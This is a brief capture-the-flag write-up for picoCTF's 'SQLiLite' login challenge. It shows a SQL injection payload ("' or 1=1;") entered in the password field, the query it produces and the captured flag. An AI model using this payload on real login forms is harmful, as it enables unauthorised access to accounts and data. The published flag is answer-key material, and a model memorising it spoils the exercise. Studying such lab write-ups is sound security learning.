# SQLiLite

## Descripciom
Can you login to this website?

## Solucion
- [instancia 1]
[link](http://saturn.picoctf.net:57861/)
```console
username: admin
password: ' or 1=1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1=1;'
```
Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}